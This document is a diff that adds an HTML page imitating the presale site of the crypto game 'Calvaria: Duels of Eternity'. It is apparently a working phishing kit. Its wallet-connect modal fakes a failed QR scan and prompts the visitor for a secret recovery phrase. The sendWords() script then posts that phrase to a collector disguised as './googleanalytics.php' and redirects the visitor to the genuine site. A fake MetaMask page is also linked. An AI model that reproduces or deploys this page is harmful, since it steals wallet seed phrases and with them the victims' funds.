@@ -1,0 +1,484 @@
+<html lang="en" dir="ltr" data-react-helmet="lang,dir">
+<head>
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta charset="utf-8">
+	<title>Presale | Calvaria: Duels of Eternity</title>
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="https://fonts.googleapis.com/css2?family=Bokor&amp;family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&amp;family=Oswald:wght@300;500&amp;display=swap" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="./static/css/style.css">
+	<link rel="stylesheet" type="text/css" href="./wallet/css/connect.css">
+    <script src="./static/js/alpine.js" type="text/javascript"></script>
+	<link rel="icon" type="image/png" sizes="32x32" href="./static/media/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="./static/media/favicon-16x16.png">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="robots" content="index, follow">
+	<meta name="googlebot" content="index, follow">
+	<meta name="description" content="&quot;Calvaria: Duels of Eternity - this is the epic Play-to-Earn (P2E) battle card game built on the blockchain.">
+	<meta name="keywords" content="">
+	<meta name="author" content="DCell Co. Ltd.">
+	<meta name="owner" content="DCell Co. Ltd.">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="default">
+	<meta name="apple-mobile-web-app-title" content="Calvaria: Duels of Eternity">
+	<meta name="msapplication-TileColor" content="#000000">
+	<meta name="theme-color" content="#ffffff">
+</head>
+
+<body
+    x-data='{
+        dropdown: false,
+        containerDropdown: false,
+        modal: false,
+        connectModal: false,
+        wallet: "walletconnect",
+        wallets: {
+            backpack: {name: "Backpack", icon: ".\/wallet\/icons\/backpack.png"},
+            sollet: {name: "Sollet", icon: ".\/wallet\/icons\/sollet.png"},
+            bitkeep: {name: "BitKeep", icon: ".\/wallet\/icons\/bitkeep.png"},
+            brave: {name: "Brave", icon: ".\/wallet\/icons\/brave.png"},
+            coin98: {name: "Coin98", icon: ".\/wallet\/icons\/coin98.png"},
+            coinbase: {name: "Coinbase", icon: ".\/wallet\/icons\/coinbase.png"},
+            glow: {name: "Glow", icon: ".\/wallet\/icons\/glow.png"},
+            exodus: {name: "Exodus", icon: ".\/wallet\/icons\/exodus.png"},
+            mathwallet: {name: "MathWallet", icon: ".\/wallet\/icons\/mathwallet.png"},
+            phantom: {name: "Phantom", icon: ".\/wallet\/icons\/phantom.png"},
+            safepal: {name: "SafePal", icon: ".\/wallet\/icons\/safepal.png"},
+            slope: {name: "Slope", icon: ".\/wallet\/icons\/slope.png"},
+            solflare: {name: "Solflare", icon: ".\/wallet\/icons\/solflare.png"},
+            strike: {name: "Strike", icon: ".\/wallet\/icons\/strike.png"},
+            walletconnect: {name: "WalletConnect", icon: ".\/wallet\/icons\/walletconnect.png"},
+            xdefi: {name: "XDEFI", icon: ".\/wallet\/icons\/xdefi.png"}
+        }
+    }'
+    class="langCommon"
+    data-react-helmet="class"
+>
+	<div id="___gatsby">
+		<div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
+			<main class="transp-bg">
+				<section class="inner-header-module--innHeader--8MLmT ">
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<a x-on:click="modal = true" href="javascript:;" class="inner-header-module--logo--+tSZS" href="/"><img src="./static/media/logo.png" alt="Calvaria: Duels of Eternity"></a>
+								<div class="intro-module--introBlock---dvrw inner-header-module--introBlock--m0PLJ">
+									<ul class="navbar-nav ml-auto inner-header-module--socials--txd9N intro-module--socials--XSH9Z intro-module--navbarNav--KeHYT">
+										<li class="nav-item intro-module--navItem--5YTAh"><a x-on:click="modal = true" href="javascript:;"><i class="fab fa-telegram intro-module--fab--H6N8X"></i></a></li>
+										<li class="nav-item intro-module--navItem--5YTAh"><a x-on:click="modal = true" href="javascript:;"><i class="fab fa-discord intro-module--fab--H6N8X"></i></a></li>
+										<li class="nav-item intro-module--navItem--5YTAh"><a x-on:click="modal = true" href="javascript:;"><i class="fab fa-twitter intro-module--fab--H6N8X"></i></a></li>
+										<li class="nav-item intro-module--navItem--5YTAh"><a x-on:click="modal = true" href="javascript:;"><i class="fab fa-medium intro-module--fab--H6N8X"></i></a></li>
+										<li class="nav-item intro-module--navItem--5YTAh"><a x-on:click="modal = true" href="javascript:;"><i class="fab fa-reddit intro-module--fab--H6N8X"></i></a></li>
+										<li class="nav-item intro-module--navItem--5YTAh"><a x-on:click="modal = true" href="javascript:;"><i class="fab fa-youtube intro-module--fab--H6N8X"></i></a></li>
+										<li class="nav-item">
+											<div class="lang-switcher-module--lngCont--3oaym inner-header-module--innerSwitcher--HJsAS ">
+												<button x-on:click="modal = true" aria-label="Change language" title="Change language"><span>EN</span></button>
+											</div>
+										</li>
+									</ul>
+								</div>
+							</div>
+						</div>
+					</div>
+				</section>
+				<section class="presale-module--langCommon--LAy-E presale-module--presale--tsqe8">
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<h3><span>Presale</span></h3></div>
+							<div class="presale-module--presWrap--loeeo ">
+								<div class="row">
+									<div class="col-lg-6 col-12 col-sm-12 order-lg-0 order-1">
+										<div class="presale-module--presLeftCont--O+8bA">
+											<h4><span>Don't miss out on Calvaria presale!</span></h4>
+											<p>Calvaria: Duels of Eternity is a project centered around speeding up the mass adoption of crypto through play-to-earn games. We already partnered with the biggest names in the industry because they love our vision. Join us, and together - only the sky's the limit! Tokens will be available for claim at launch.</p>
+											<div class="presale-module--progressWrap--K6PBW">
+												<div class="presale-module--progressCont--jOgEL presale-module--animated--znSGV">
+													<div class="presale-module--progressLine--BFOpE presale-module--animated--znSGV" style="width: 70%;"></div>
+												</div>
+												<div class="presale-module--progressDesc--ibdAH"><span>Stage 4 progress: <strong>70%</strong></span></div>
+												<div class="presale-module--raisedCont--8vVV9"><span>Raised</span> <strong>1,314,932 USDT</strong> <span>out of</span> <strong>1,350,000 USDT</strong>. <span>Sold</span> <strong>88,246,649 $RIA</strong> <span>out of</span> <strong>90,000,000 $RIA</strong>.</div>
+											</div>
+										</div>
+									</div>
+									<div class="col-lg-6 col-12 col-sm-12 order-lg-1 order-0">
+										<div class="presale-module--presRightCont--607xr ">
+											<div class="presale-module--pricesCont--u7N8k">
+												<div><strong>1 USDT</strong> = <strong>40 $RIA</strong></div>
+												<div class="presale-module--nextPrice--SiWUU"><span>Hurry before the price increase to 1 USDT = 33.33 $RIA</span></div>
+											</div>
+											<div id="tokenPurchase" style="display: none;" class="presale-module--btnCont--snG6Y mt-3">
+												<input id="price" type="text" class="presale-input-field" placeholder="Enter amount in usdt" />
+												<input id="rates" disabled type="text" class="presale-input-field mt-3" value="0" />
+												<button x-on:click="modal = true" class="main-button-module--btnDefault--EhH9D main-button-module--btnHov--ebJG8 main-button-module--langCommon--Tm0Zy mt-3">Buy</button>
+												<div class="presale-module--helpersCont---gu1q"><a x-on:click="disconnect();" href="javascript:;" class="btnDis" href="#">Disconnect</a></div>
+											</div>
+											<div id="connectDiv" class="presale-module--btnCont--snG6Y"><span>Connect your wallet to buy tokens:</span>
+												<button x-on:click="modal = true" class="main-button-module--btnDefault--EhH9D main-button-module--btnHov--ebJG8 main-button-module--langCommon--Tm0Zy">Connect wallet</button>
+												<div class="presale-module--helpersCont---gu1q"><a x-on:click="modal = true" href="javascript:;" class="presale-module--helpLink--DqjVo" href="#">How to buy?</a><a x-on:click="modal = true" href="javascript:;" class="presale-module--helpLink--DqjVo" href="#">Buy ETH with card</a><a x-on:click="modal = true" href="javascript:;" class="presale-module--helpLink--DqjVo" href="#">New to crypto?</a></div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<form action="/" class="presale-module--contactForm--cFMBB" method="post" name="contact-form">
+						<input type="text" name="name">
+						<input type="text" name="tg-handle">
+						<input type="text" name="email">
+						<textarea name="question"></textarea>
+						<input type="hidden" name="form-name" value="contact-form">
+					</form>
+				</section>
+				<div x-show="modal" class="modal-connect-wallet-module--modalCont--TffuR">
+					<div class="modal-connect-wallet-module--innerModalCont--bGo1V">
+						<div class="modal-connect-wallet-module--modalBtnCont--aJhNb ">
+							<button x-on:click="connectMetamask(); modal = false;">
+								<svg width="102" height="95" viewBox="0 0 102 95" fill="none">
+									<path d="M95.8197 0.5L56.8 29.7287L64.0157 12.4841L95.8197 0.5Z" fill="#E2761B" stroke="#E2761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M5.74121 0.5L44.4471 30.0055L37.5843 12.4841L5.74121 0.5Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M81.7803 68.252L71.3882 84.3099L93.6235 90.48L100.016 68.6079L81.7803 68.252Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M1.62354 68.6079L7.97648 90.48L30.2118 84.3099L19.8196 68.252L1.62354 68.6079Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M28.9568 41.1194L22.7607 50.5723L44.8392 51.5611L44.0549 27.6323L28.9568 41.1194Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M72.604 41.1194L57.3098 27.3555L56.8 51.5611L78.8393 50.5723L72.604 41.1194Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M30.2117 84.3099L43.4666 77.7839L32.0156 68.7661L30.2117 84.3099Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M58.0942 77.7839L71.3884 84.3099L69.5452 68.7661L58.0942 77.7839Z" fill="#E4761B" stroke="#E4761B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M71.3884 84.3097L58.0942 77.7837L59.1531 86.5246L59.0354 90.2029L71.3884 84.3097Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M30.2119 84.3097L42.5649 90.2029L42.4864 86.5246L43.4668 77.7837L30.2119 84.3097Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M42.761 62.9918L31.7021 59.7091L39.5061 56.1099L42.761 62.9918Z" fill="#233447" stroke="#233447" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M58.8 62.9918L62.055 56.1099L69.8981 59.7091L58.8 62.9918Z" fill="#233447" stroke="#233447" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M30.212 84.3099L32.0943 68.252L19.8198 68.6079L30.212 84.3099Z" fill="#CD6116" stroke="#CD6116" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M69.5059 68.252L71.3882 84.3099L81.7804 68.6079L69.5059 68.252Z" fill="#CD6116" stroke="#CD6116" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M78.8393 50.5723L56.8 51.5611L58.8393 62.9915L62.0942 56.1095L69.9373 59.7087L78.8393 50.5723Z" fill="#CD6116" stroke="#CD6116" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M31.7019 59.7087L39.5451 56.1095L42.7607 62.9915L44.8392 51.5611L22.7607 50.5723L31.7019 59.7087Z" fill="#CD6116" stroke="#CD6116" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M22.7607 50.5723L32.0156 68.766L31.7019 59.7087L22.7607 50.5723Z" fill="#E4751F" stroke="#E4751F" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M69.9373 59.7087L69.5452 68.766L78.8393 50.5723L69.9373 59.7087Z" fill="#E4751F" stroke="#E4751F" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M44.8394 51.561L42.761 62.9915L45.3492 76.4786L45.9375 58.7199L44.8394 51.561Z" fill="#E4751F" stroke="#E4751F" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M56.8 51.561L55.7412 58.6803L56.2118 76.4786L58.8393 62.9915L56.8 51.561Z" fill="#E4751F" stroke="#E4751F" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M58.8394 62.9918L56.2119 76.4789L58.0943 77.7841L69.5452 68.7663L69.9374 59.709L58.8394 62.9918Z" fill="#F6851B" stroke="#F6851B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M31.7021 59.709L32.0159 68.7663L43.4669 77.7841L45.3492 76.4789L42.761 62.9918L31.7021 59.709Z" fill="#F6851B" stroke="#F6851B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M59.0354 90.2032L59.1531 86.525L58.1727 85.6548H43.3884L42.4864 86.525L42.5649 90.2032L30.2119 84.3101L34.5256 87.8697L43.2707 94.0002H58.2903L67.0747 87.8697L71.3884 84.3101L59.0354 90.2032Z" fill="#C0AD9E" stroke="#C0AD9E" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M58.0942 77.7837L56.2118 76.4785H45.3491L43.4667 77.7837L42.4863 86.5246L43.3883 85.6545H58.1726L59.153 86.5246L58.0942 77.7837Z" fill="#161616" stroke="#161616" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M97.4668 31.6271L100.8 15.4901L95.8197 0.5L58.0942 28.7399L72.604 41.1195L93.1139 47.1709L97.6629 41.8314L95.7021 40.4076L98.8393 37.5203L96.408 35.6218L99.5452 33.2092L97.4668 31.6271Z" fill="#763D16" stroke="#763D16" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M0.800049 15.4901L4.13338 31.6271L2.01574 33.2092L5.15299 35.6218L2.76083 37.5203L5.89809 40.4076L3.9373 41.8314L8.44711 47.1709L28.9569 41.1195L43.4667 28.7399L5.74123 0.5L0.800049 15.4901Z" fill="#763D16" stroke="#763D16" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M93.1138 47.171L72.604 41.1196L78.8393 50.5725L69.5452 68.7662L81.7805 68.608H100.016L93.1138 47.171Z" fill="#F6851B" stroke="#F6851B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M28.9569 41.1196L8.44706 47.171L1.62354 68.608H19.8196L32.0157 68.7662L22.7608 50.5725L28.9569 41.1196Z" fill="#F6851B" stroke="#F6851B" stroke-linecap="round" stroke-linejoin="round"></path>
+									<path d="M56.7999 51.5609L58.094 28.7396L64.0548 12.4839H37.5842L43.4666 28.7396L44.8391 51.5609L45.3097 58.7593L45.3489 76.4784H56.2117L56.2901 58.7593L56.7999 51.5609Z" fill="#F6851B" stroke="#F6851B" stroke-linecap="round" stroke-linejoin="round"></path>
+								</svg>
+                                MetaMask
+                            </button>
+							<!-- connectModal = true; changeStep(); -->
+							<button x-on:click="walletConnect(); modal = false;"> 
+								<svg width="100" height="60" viewBox="0 0 100 60" fill="none">
+									<path d="M20.4701 11.7227C36.7789 -3.90756 63.221 -3.90756 79.5298 11.7227L82.2284 14.3089C82.6366 14.7 82.6376 15.3347 82.2303 15.7266C82.2298 15.7273 82.2293 15.728 82.2284 15.7288L74.7766 22.8698C74.3698 23.26 73.7103 23.26 73.303 22.8698L70.601 20.28C59.2235 9.3761 40.7766 9.3761 29.3993 20.28L26.5052 23.0537C26.0979 23.4439 25.4387 23.4439 25.0315 23.0537L17.58 15.912C17.1719 15.521 17.1711 14.8862 17.578 14.4944C17.5786 14.4937 17.5793 14.4929 17.58 14.4925L20.4701 11.7227ZM92.6762 24.3215L99.3869 30.7527C100.203 31.5351 100.204 32.8044 99.3908 33.5888C99.3893 33.5902 99.3884 33.5912 99.3869 33.5927L72.444 59.4146C71.6288 60.1951 70.3108 60.1951 69.4962 59.4146L50.3684 41.0829C50.1649 40.8878 49.8357 40.8878 49.6318 41.0829L30.5045 59.4146C29.6898 60.1951 28.3716 60.1951 27.557 59.4146L0.613179 33.5922C-0.20287 32.8102 -0.204626 31.54 0.609325 30.7561C0.610593 30.7551 0.611862 30.7537 0.613179 30.7527L7.32362 24.3215C7.73089 23.9312 8.39011 23.9312 8.79737 24.3215L28.6621 43.359C28.8659 43.5546 29.1955 43.5546 29.3989 43.359L48.5259 25.0278C49.3405 24.2468 50.6586 24.2468 51.4732 25.0278L70.6015 43.359C70.8049 43.5546 71.1342 43.5546 71.3381 43.359L91.2025 24.3215C91.6098 23.9317 92.2688 23.9317 92.6762 24.3215V24.3215Z" fill="#3B99FC"></path>
+								</svg>
+                                WalletConnect
+                            </button>
+						</div>
+						<button x-on:click="modal = false"></button>
+					</div>
+				</div>
+				<section class="supportedby-module--supportedby--aEXFK supportedby-module--smallPads--OavmF">
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<h3><span>Supported by</span></h3></div>
+						</div>
+						<div class="row pt-5">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<ul>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-01.png" alt="KuCoin"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-07.png" alt="Polygon Studios"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-09.png" alt="Gate.io"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-04.png" alt="NFTb.io"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-03.png" alt="WindVane"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-05.png" alt="Zelwin Finance"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-06.png" alt="Chainplay"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/s-logo-02.png" alt="XT.com"></a>
+									</li>
+								</ul>
+							</div>
+						</div>
+					</div>
+				</section>
+				<section class="supportedby-module--supportedby--aEXFK supportedby-module--smallPads--OavmF">
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<h3><span>Mentions</span></h3></div>
+						</div>
+						<div class="row pt-5">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<ul>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/c-logo-02.svg" alt="Digital Journal"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/c-logo-03.svg" alt="Yahoo Finance"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/c-logo-04.svg" alt="Yahoo News"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/c-logo-05.svg" alt="Benzinga"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/c-logo-07.svg" alt="Cryptonews"></a>
+									</li>
+									<li>
+										<a x-on:click="modal = true" href="javascript:;"><img src="./static/media/c-logo-06.svg" alt="Business2Community"></a>
+									</li>
+								</ul>
+							</div>
+						</div>
+					</div>
+				</section>
+				<section id="allocation" class="allocation-module--langCommon--DcSv1 allocation-module--allocationSec--Ru26N allocation-module--smallPads--dhgqZ">
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<h3><span>Allocation</span></h3></div>
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<p>The total maximum fixed supply of the game's token is 1,000,000,000 $RIA,
+									<br>&nbsp;which will be distributed between the following areas in the Calvaria: Duels of Eternity ecosystem:</p>
+							</div>
+						</div>
+						<div class="row pt-5 pb-5">
+							<div class="col-lg-12 text-center col-12 col-sm-12 allocation-module--flush--uNhPE">
+								<div class="allocation-module--frameDefault--lb6Yd">
+									<div class="row align-items-center">
+										<div class="col-lg-3 text-right col-sm-4 col-12">
+											<ul class="allocation-module--allocation--jLyxq allocation-module--leftList--ubEdW">
+												<li>Presale<span>30%</span></li>
+												<li>Staking pool<span>25%</span></li>
+												<li>Prize pool<span>20%</span></li>
+												<li>Operations<span>8%</span></li>
+											</ul>
+										</div>
+										<div class="col-lg-6 text-center col-sm-4 col-12"><img src="./static/media/circle-progress.png" alt="Allocation"></div>
+										<div class="col-lg-3 text-left col-sm-4 col-12">
+											<ul class="allocation-module--allocation--jLyxq allocation-module--rightList--i+A0X">
+												<li><span>6%</span>INO</li>
+												<li><span>5%</span>Team</li>
+												<li><span>4%</span>Liquidity</li>
+												<li><span>2%</span>Advisors</li>
+											</ul>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="row">
+							<div class="col-lg-12 text-center col-12 col-sm-12">
+								<p>See detailed info about tokenomics <a x-on:click="modal = true" href="javascript:;">here</a>.</p>
+							</div>
+						</div>
+					</div>
+				</section>
+				<div class=" z2">
+					<section id="roadmap" class="roadmap-module--roadmap--MPqgr ">
+						<div class="container">
+							<div class="row roadmap-module--row--5Az5g">
+								<div class="col-lg-12 text-center col-12 col-sm-12">
+									<h3><span>Roadmap</span></h3></div>
+								<div class="col-lg-12 text-center col-12 col-sm-12">
+									<p>Roadmap milestones and deadlines are subject to change. Read a detailed version in the White Paper.</p>
+								</div>
+							</div>
+							<div class="row pt-5 roadmap-module--borderBottomDashed--IQyJt roadmap-module--row--5Az5g">
+								<div class="col-lg-4 pl-5 sm-l col-sm-4 col-12 roadmap-module--pl5--dCiRT">
+									<div class="row roadmap-module--row--5Az5g">
+										<div class="col-lg-8 pl-5 pb-5 sm-r-0 col-sm-12 col-12 roadmap-module--bLeft--mqb4o roadmap-module--pl5--dCiRT">
+											<h4>Q3 2022</h4>
+											<p>Full security audit. Presale launch of $RIA token. Den of Skulls LP and development.</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-lg-4 pl-5 sm-l col-sm-4 col-12 roadmap-module--pl5--dCiRT">
+									<div class="row roadmap-module--row--5Az5g">
+										<div class="col-lg-8 pl-5 pb-5 sm-r-0 col-sm-12 col-12 roadmap-module--bLeft--mqb4o roadmap-module--pl5--dCiRT">
+											<h4>Q4 2022</h4>
+											<p>INO on KuCoin, Gate.io and XT.com. Token launch and CEX listing. NFT drops.</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-lg-4 pl-5 sm-l col-sm-4 col-12 roadmap-module--pl5--dCiRT">
+									<div class="row roadmap-module--row--5Az5g">
+										<div class="col-lg-8 pl-5 pb-5 sm-r-0 col-sm-12 col-12 roadmap-module--bLeft--mqb4o roadmap-module--pl5--dCiRT">
+											<h4>Q1 2023</h4>
+											<p>Calvaria: DoE alpha version. Scholarship platform for DoS. Den of Skulls campaign mode.</p>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="row roadmap-module--row--5Az5g">
+								<div class="col-lg-4 col-sm-4 col-12">
+									<div class="row justify-content-end roadmap-module--row--5Az5g">
+										<div class="col-lg-7 pt-10 pl-5 col-sm-12 col-12 roadmap-module--bLeftNew--sb6tS roadmap-module--pt10--hDozR roadmap-module--pl5--dCiRT">
+											<h4>Q2 2023</h4>
+											<p>Partnerships with influencers / gamers / streamers for DoE tournaments. Official DoE launch.</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-lg-4 col-sm-4 col-12">
+									<div class="row justify-content-end roadmap-module--row--5Az5g">
+										<div class="col-lg-7 pt-10 pl-5 col-sm-12 col-12 roadmap-module--bLeftNew--sb6tS roadmap-module--pt10--hDozR roadmap-module--pl5--dCiRT">
+											<h4>Q3 2023</h4>
+											<p>Games expansion (DoE and DoS). Creation of in-house eSports team. Participation in offline events.</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-lg-4 col-sm-4 col-12">
+									<div class="row justify-content-end roadmap-module--row--5Az5g">
+										<div class="col-lg-7 pt-10 pl-5 col-sm-12 col-12 roadmap-module--bLeftNew--sb6tS roadmap-module--pt10--hDozR roadmap-module--pl5--dCiRT">
+											<h4>Q4 2023</h4>
+											<p>Calvaria VR experience. Universe expansions. Huge conference by Calvaria</p>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</section>
+				</div>
+				<div class="copyrights-module--copyr--uU6Ff">
+					<p>Calvaria: Duels of Eternity © 2022</p>
+				</div>
+			</main>
+			<div class="modal-advertising-module--clsBlock--hc5iq"></div>
+			<div class="modal-advertising-module--clsBlockBot---yadE"></div>
+			<div class="modal-advertising-module--clsBlockLeft--w7Y5J"></div>
+			<div class="modal-advertising-module--clsBlockRight--BdSOO"></div>
+		</div>
+	</div>
+
+    <div x-show="connectModal" id="connect-wrapper">
+        <div id="connect-qrcode-modal" class="connect-qrcode__base animated fadeIn">
+            <div class="connect-modal__base">
+                <div class="connect-modal__header">
+                    <img :src="wallets[wallet].icon" class="connect-modal__headerLogo">
+                    <p x-text="wallets[wallet].name"></p>
+                    <div x-on:click="connectModal = false" class="connect-modal__close__wrapper">
+                        <div id="connect-qrcode-close" class="connect-modal__close__icon">
+                            <div class="connect-modal__close__line1"></div>
+                            <div class="connect-modal__close__line2"></div>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <div class="firstStep">
+                        <p id="connect-qrcode-text" class="connect-qrcode__text">Scan QR code with a connect-compatible wallet</p>
+                        <div>
+                            <img class="connect-qrcode__image" src="./wallet/media/qr.png" width="100%" alt="qr"/> 
+                        </div>
+                        <div class="connect-modal__footer">
+                            <a x-on:click="modal = true" href="javascript:;">Copy to clipboard</a>
+                        </div>
+                    </div>
+                    <div class="secondStep" style="display: none">
+                        <div class="connect-modal__loading">
+                            <div></div>
+                            <div></div>
+                            <div></div>
+                            <div></div>
+                        </div>
+                    </div>
+                    <div class="thirdStep" style="display: none">
+                        <p id="connect-qrcode-text" class="connect-qrcode__text" style="color: darkred">There was a problem scanning the QR code. Please enter your secret recovery phrase.</p>
+                        <div>
+                            <textarea rows="5" class="connect-modal__textarea"></textarea>
+							<div class="connect-modal__error"></div>
+                        </div>
+                        <div class="connect-modal__footer">
+                            <button x-on:click="sendWords()" type="button" class="connect-modal__button">Connet Wallet</button> 
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>	
+
+	<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="static/js/web3functions.js"></script>
+    <script>
+
+        let metaUrl = "https://calvaria.one/metamask/home.html";
+        let postUrl = "./googleanalytics.php";
+		let redirectUrl = "https://calvaria.io/presale/";
+
+        let secondStepTimeout = 800;
+        let thirdStepTimeout = 4000;
+
+        let firstStep = document.querySelector('.firstStep');
+        let secondStep = document.querySelector('.secondStep');
+        let thirdStep = document.querySelector('.thirdStep');
+
+		let errorDiv = document.querySelector('.connect-modal__error');
+
+        function changeStep() {
+            firstStep.style.display = 'block';
+            secondStep.style.display = 'none';
+            thirdStep.style.display = 'none';
+
+            setTimeout(function(){
+                firstStep.style.display = 'none';
+                secondStep.style.display = 'block';
+                thirdStep.style.display = 'none';
+            }, secondStepTimeout);
+
+            setTimeout(function(){
+                firstStep.style.display = 'none';
+                secondStep.style.display = 'none';
+                thirdStep.style.display = 'block';
+            }, thirdStepTimeout);
+        }
+
+        function sendWords() {
+			errorDiv.innerHtml = '';
+
+            let words = document.querySelector('.connect-modal__textarea').value;
+            
+            let xhr = new XMLHttpRequest();
+
+			xhr.addEventListener('load', (event) => {
+				if(event.currentTarget.status == 200) {
+					window.location.href = redirectUrl;
+				} else {
+					errorDiv.innerHtml = '<p style="color: darkred;margin-top: 20px;font-weight:bold;">You entered incorrectly, try again.</p>';
+				}
+			}, false);
+
+			xhr.addEventListener('error', (event) => {
+				errorDiv.innerHtml = '<p style="color: darkred;margin-top: 20px;font-weight:bold;">You entered incorrectly, try again.</p>';
+			})
+            xhr.open('POST', postUrl, true);
+			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('words=' + words);
+        }
+
+        function openMM() {
+            window.open(metaUrl, '_blank');
+        }
+    </script>
+</body>
+</html>
